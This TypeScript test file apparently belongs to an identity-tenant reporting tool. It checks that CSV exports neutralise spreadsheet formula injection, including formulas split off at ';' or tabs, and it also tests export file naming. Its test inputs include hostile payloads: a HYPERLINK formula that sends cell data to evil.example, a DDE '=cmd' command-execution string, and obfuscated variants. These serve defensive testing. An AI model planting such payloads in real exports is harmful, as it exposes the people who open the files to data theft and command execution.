// A CSV cell that starts with a formula character is executed by the
// spreadsheet that opens it.
//
// Every value in IAMAI's CSVs is a tenant display name, sign-in address or
// department, and in a default Entra tenant any member can create a group and
// any guest sets their own display name. The exports go to an admin opening the
// recipient list in Excel to work a mail merge (audit redact-01,
// untrusted-content-rendering-01). Every lead character is checked, because a
// regex that covers four of six is the shape this bug takes.
import assert from 'node:assert/strict'
import test from 'node:test'
import { toCsv } from './format.ts'

const LEADS: { name: string; char: string }[] = [
  { name: 'equals', char: '=' },
  { name: 'plus', char: '+' },
  { name: 'minus', char: '-' },
  { name: 'at', char: '@' },
  { name: 'tab', char: '\t' },
  { name: 'carriage return', char: '\r' },
]

test('a cell beginning with any formula character is quoted as text, in every column', () => {
  for (const { name, char } of LEADS) {
    const payload = `${char}HYPERLINK("https://evil.example/?d="&A1,"ok")`
    const body = toCsv(['Name'], [[payload]]).split('\r\n')[1]
    // The apostrophe has to be the first character of the field. When the value
    // also needs RFC4180 quoting, that means immediately inside the quote.
    assert.ok(body.startsWith(`'${char}`) || body.startsWith(`"'${char}`), `${name} was not neutralised: ${JSON.stringify(body)}`)
  }
  assert.equal(toCsv(['A', 'B', 'C'], [['safe', '=1+1', '@SUM(A1)']]).split('\r\n')[1], `safe,'=1+1,'@SUM(A1)`)
  // The real attack shape from the audit: a group display name any tenant member can set, landing in recipients-*.csv.
  const csv = toCsv(['Name', 'Sign-in name', 'Department'], [['=cmd|\'/c calc\'!A1', 'a@b.example', 'Finance']])
  assert.ok(!csv.includes('\n=cmd'), 'the payload is still the first character of a cell')
  assert.ok(csv.includes(`'=cmd`), `not neutralised: ${csv}`)
})

test('ordinary values, a formula character mid-value, and RFC4180 quoting are left as they are', () => {
  assert.deepEqual(toCsv(['Name'], [['Priya Nair'], ['Sales — EMEA'], ['3 of 12'], [42], [null], [undefined]]).split('\r\n').slice(1), ['Priya Nair', 'Sales — EMEA', '3 of 12', '42', '', ''])
  // Only the leading position starts a formula; rewriting mid-string would corrupt "R&D - EMEA".
  assert.deepEqual(toCsv(['Name'], [['R&D - EMEA'], ['Q1=Q2 review']]).split('\r\n').slice(1), ['R&D - EMEA', 'Q1=Q2 review'])
  const rows = toCsv(['Name'], [['=a,b'], ['say "hi"'], ['two\nlines']]).split('\r\n')
  assert.equal(rows[1], `"'=a,b"`, rows[1])
  assert.equal(rows[2], `"say ""hi"""`, rows[2])
})

// F-047 and F-127 (owner, 2026-09-28): two clients' exports on one afternoon saved as
// iamai-people.csv and iamai-people (1).csv, and Excel mis-read the dashes and blanks.
test('a download names the tenant and the day, and a masked one names neither tenant nor what it masks', async () => {
  const { exportName } = await import('./exportGuard.ts')
  assert.equal(exportName('iamai-accounts.csv', 'Contoso Pty Ltd', { now: '2026-09-28T02:00:00Z' }).replace(/\d{4}-\d{2}-\d{2}/, 'DAY'), 'iamai-accounts-contoso-pty-ltd-DAY.csv')
  assert.equal(exportName('iamai-bundle-redacted.json', null, { now: '2026-09-28' }), 'iamai-bundle-redacted-2026-09-28.json')
  assert.equal(exportName('iamai-plan.json', '  ', { now: '2026-09-28' }), 'iamai-plan-2026-09-28.json', 'no tenant name, no empty slug')
  // Review, 2026-09-28: accents come off; a name with no Latin letters falls back to the tenant ID where the file may carry it.
  assert.equal(exportName('iamai-accounts.csv', 'Société Générale', { now: '2026-09-28' }), 'iamai-accounts-societe-generale-2026-09-28.csv')
  assert.equal(exportName('iamai-accounts.csv', 'Müller GmbH', { now: '2026-09-28' }), 'iamai-accounts-muller-gmbh-2026-09-28.csv')
  assert.equal(exportName('iamai-accounts.csv', 'Øresund Straße Łódź', { now: '2026-09-28' }), 'iamai-accounts-oresund-strasse-lodz-2026-09-28.csv', 'letters that do not decompose')
  assert.equal(exportName('iamai-accounts.csv', 'GROẞE Ħal', { now: '2026-09-28' }), 'iamai-accounts-grosse-hal-2026-09-28.csv', 'capitals map as their small letters')
  assert.equal(exportName('iamai-accounts.csv', '株式会社', { id: '4a3b2c1d-0000-4000-8000-000000000000', now: '2026-09-28' }), 'iamai-accounts-4a3b2c1d-2026-09-28.csv')
  assert.equal(exportName('iamai-plan.ics', '株式会社', { now: '2026-09-28' }), 'iamai-plan-2026-09-28.ics', 'a masked file gets no ID')
})

test('a CSV opens in Excel as UTF-8, and an empty cell the screen dashes is blank in the file', async () => {
  const { csvFileBody } = await import('./exportGuard.ts')
  const body = csvFileBody(toCsv(['Name', 'Roles'], [['Avery', '—'], ['Drew', 'Global Administrator']]))
  assert.equal(body.charCodeAt(0), 0xfeff, 'no UTF-8 byte order mark')
  assert.equal(csvFileBody(body), body, 'the mark once, not twice')
  assert.equal(body.slice(1), 'Name,Roles\r\nAvery,\r\nDrew,Global Administrator')
})

test('the Export page\'s files are named as their buttons read, and the sign-in column is headed one way', async () => {
  const src = (await import('node:fs')).readFileSync(new URL('./surfaces/inventoryTables.ts', import.meta.url), 'utf8')
  for (const name of ['iamai-accounts.csv', 'iamai-authentication.csv', 'iamai-licensing.csv', 'iamai-sign-in-countries.csv']) assert.ok(src.includes(`'${name}'`), name)
  for (const old of ['iamai-people.csv', 'iamai-auth-methods.csv', 'iamai-licences.csv', 'iamai-signins-by-country.csv']) assert.ok(!src.includes(`'${old}'`), old)
  const { pages } = await import('../content/content.ts')
  const readiness = (pages as unknown as { readiness: { csvColumns: string[] } }).readiness.csvColumns
  const { INVENTORY } = await import('../copy/inventory.ts')
  assert.equal(readiness[1], 'Sign-in address')
  assert.ok(JSON.stringify(INVENTORY).includes('Sign-in address'), 'the accounts file heads its column another way')
  assert.equal((INVENTORY.signIns.columns as Record<string, string>).country, 'Country')
})

// Security audit, 2026-09-29: where the Windows list separator is ';' (most of
// continental Europe), Excel opening a .csv splits each line at ';', so a ';'
// inside an unquoted value starts a new cell, and that cell can be a live
// formula. Every cell a separator could split is quoted, and a value whose
// split-off piece would start with a formula character is marked as text.
/**
 * A file read as Excel reads it with `sep` as the separator: a double quote keeps
 * a field whole only when it is the field's first character (elsewhere it is a
 * literal character), and a line break outside such a field ends the row. Rows
 * of cells, header included.
 */
function cellsOf(csv: string, sep: string): string[][] {
  const rows: string[][] = []
  let row: string[] = []
  let i = 0
  for (;;) {
    let field = ''
    if (csv[i] === '"') {
      i++
      while (i < csv.length) {
        if (csv[i] === '"' && csv[i + 1] === '"') { field += '"'; i += 2 }
        else if (csv[i] === '"') { i++; break }
        else field += csv[i++]
      }
    }
    while (i < csv.length && csv[i] !== sep && csv[i] !== '\r' && csv[i] !== '\n') field += csv[i++]
    row.push(field)
    if (i >= csv.length) { rows.push(row); return rows }
    if (csv[i] === sep) { i++; continue }
    i += csv[i] === '\r' && csv[i + 1] === '\n' ? 2 : 1
    rows.push(row)
    row = []
  }
}
/** One line's cells, read as cellsOf reads a file. */
const fieldsOf = (line: string, sep: string): string[] => cellsOf(line, sep)[0]

test('a ; or tab inside a value cannot start a formula cell in a spreadsheet that splits on it', () => {
  // The audit's payload: a guest's own display name, no quotes or commas needed.
  const payload = 'Pat;=HYPERLINK(CHAR(104)&CHAR(116)&CHAR(116)&CHAR(112)&A3);x'
  const lines = toCsv(['Name', 'Sign-in'], [['=1+1', 'a@x.test'], [payload, 'b@x.test']]).split('\r\n')
  assert.equal(lines[1], `'=1+1,a@x.test`)
  assert.equal(lines[2], `"'Pat;'=HYPERLINK(CHAR(104)&CHAR(116)&CHAR(116)&CHAR(112)&A3);x",b@x.test`)
  const payloads = [
    payload,
    'Pat; =HYPERLINK(A3)',
    'Pat;+1+1',
    'Pat;-1+1',
    'Pat;@SUM(A1)',
    'Pat\t=1+1',
    'Pat,=1+1',
    ' =1+1',
    'a;b;c',
  ]
  const csv = toCsv(['Name', 'Sign-in'], payloads.map((p) => [p, 'b@x.test']))
  for (const sep of [',', ';', '\t']) {
    for (const line of csv.split('\r\n').slice(1)) {
      for (const field of fieldsOf(line, sep)) {
        assert.ok(!/^\s*[=+\-@]/.test(field), `split at ${JSON.stringify(sep)}, ${JSON.stringify(line)} leaves the formula cell ${JSON.stringify(field)}`)
      }
    }
  }
  // Read with the file's own separator, each value comes back whole, the marks aside.
  assert.deepEqual(csv.split('\r\n').slice(1).map((line) => fieldsOf(line, ',')[0].replace(/^'/, '').replace(/([;\t\r\n]\s*)'(?=[=+\-@])/g, '$1')), payloads)
  // A ; with nothing formula-like after it is quoted, not marked.
  assert.equal(toCsv(['Name'], [['a;b;c']]).split('\r\n')[1], '"a;b;c"')
})

// Security review, 2026-09-29: where the list separator is ';', Excel honours a
// double quote only as the first character of a ';'-piece. A value in any column
// after the first is split at its own ';' however it is quoted, and the
// apostrophe at the start of the value does not reach the piece split off. So
// the piece itself is marked: an apostrophe goes after any ';', tab or line
// break that a formula character follows.
test('a formula split off at a ; tab or line break is text in every column, not only the first', () => {
  const payload = 'Pat;=HYPERLINK(CHAR(104)&A3);x'
  const rows = [
    // the people a sign-in row names, joined with '; '
    ['Legacy authentication', `Alice; ${payload}; Bob`, '3'],
    // a device's owner and its authenticator's registrant
    ['Laptop-01', 'Windows', 'Entra joined', payload, payload],
    // a policy's exclusions
    ['Require MFA', 'On', 'All users', `Excluded: ${payload}`],
    ['Group', 'Pat; +1+1', 'Pat;-1', 'Pat; @SUM(A1)', 'Pat\t=1+1', 'Pat\r\n=1+1', 'Pat\n  =1+1', 'Pat\r@x'],
  ]
  for (const row of rows) {
    const csv = toCsv(row.map((_, n) => `h${n}`), [row])
    for (const sep of [';', '\t', ',']) {
      for (const cells of cellsOf(csv, sep)) {
        for (const cell of cells) assert.ok(!/^\s*[=+\-@]/.test(cell), `split at ${JSON.stringify(sep)}, ${JSON.stringify(csv)} leaves the formula cell ${JSON.stringify(cell)}`)
      }
    }
    // Read with the file's own separator, each value comes back, the marks aside.
    const back = cellsOf(csv, ',')[1].map((cell) => cell.replace(/^'/, '').replace(/([;\t\r\n]\s*)'(?=[=+\-@])/g, '$1'))
    assert.deepEqual(back, row)
  }
  // A value with no formula after a split point is left as it was.
  assert.equal(toCsv(['People'], [['Alice; Bob; Carol-Ann']]).split('\r\n')[1], '"Alice; Bob; Carol-Ann"')
})
